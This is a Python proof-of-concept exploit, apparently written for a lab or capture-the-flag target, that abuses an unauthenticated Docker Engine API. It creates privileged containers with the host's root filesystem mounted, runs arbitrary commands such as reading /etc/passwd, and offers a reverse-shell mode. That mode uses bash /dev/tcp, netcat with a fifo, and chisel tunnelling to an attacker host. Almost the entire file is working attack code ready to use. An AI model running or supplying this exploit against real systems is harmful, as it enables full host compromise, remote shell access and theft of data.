#!/usr/bin/python3
import requests
import sys
import time

def exploit(target, command):

    # Step 1: Create container
    print("[+] Creating container")
    payload = {
        "Image": "alpine:latest",
        "Cmd": ["sh", "-c", command],
        "HostConfig": {
            "Privileged": True,
            "Binds": ["/:/pwn"]
        }
    }
    

    # Send Post request to create container
    r = requests.post(f"{target}/containers/create", json=payload)
    container_id = r.json()["Id"][:12]
    print(f"[+] Container created: {container_id}")
    


    # Step 2: Start container
    print("[+] Starting container")
    requests.post(f"{target}/containers/{container_id}/start")
    
    # Wait for execution
    time.sleep(2)
    
    # Step 3: Get output from logs
    r = requests.get(f"{target}/containers/{container_id}/logs?stdout=1&stderr=1")
    
    # Parse Docker logs (remove 8-byte headers)
    raw = r.content
    output = ""
    i = 0
    while i + 8 <= len(raw):
        size = int.from_bytes(raw[i+4:i+8], "big")
        if i + 8 + size <= len(raw):
            output += raw[i+8:i+8+size].decode()
            i += 8 + size
        else:
            break
    
    print("="*50)
    print(output.strip())
    print("="*50)


# Reverse shell time here
def reverse_shell(target, lhost, lport):
    print(f"[+] Sending reverse shell to {lhost}:{lport}")
    input("[*] Press Enter when you are ready...")
    


    # Multiple reverse shell methods (ai generated this one)
    shell_cmd = f"""
    apk add --no-cache bash busybox 2>/dev/null;
    if command -v bash >/dev/null 2>&1; then
        bash -i >& /dev/tcp/{lhost}/{lport} 0>&1;
    elif command -v nc >/dev/null 2>&1; then
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {lhost} {lport} > /tmp/f;
    else
        exec 3<>/dev/tcp/{lhost}/{lport}; cat <&3 | sh >&3 2>&3;
    fi
    """
    


    payload = {
        "Image": "alpine:latest",
        "Cmd": ["sh", "-c", shell_cmd],
        "HostConfig": {
            "Privileged": True,
            "Binds": ["/:/pwn"],
            "NetworkMode": "host"
        }
    }
    
    r = requests.post(f"{target}/containers/create", json=payload)
    cid = r.json()["Id"][:12]
    print(f"[+] Container created: {cid}")
    
    requests.post(f"{target}/containers/{cid}/start")
    print("[+] Shell sent! Check your listener")
    print("[+] In shell: cd /pwn")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Please Make sure that you are connect to the proxy:-")
        print("./chisel server --reverse --port 8000")
        print("./chisel client Attacker_IP:8000 R:2375:Container_IP:2375")
        print("\n")
        print("Usage:")
        print("  Command:  python3 poc.py <target> <command>")
        print("  Shell:    python3 poc.py <target> shell <your_ip> <port>")
        print("\nExamples:")
        print("  python3 poc.py http://localhost:2375 'whoami'")
        print("  python3 poc.py http://localhost:2375 'cat /pwn/etc/passwd'")
        print("  python3 poc.py http://localhost:2375 shell 10.10.x.x 443")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if sys.argv[2] == "shell":
        lhost = sys.argv[3]
        lport = sys.argv[4]
        reverse_shell(target, lhost, lport)
    else:
        command = sys.argv[2]
        exploit(target, command)
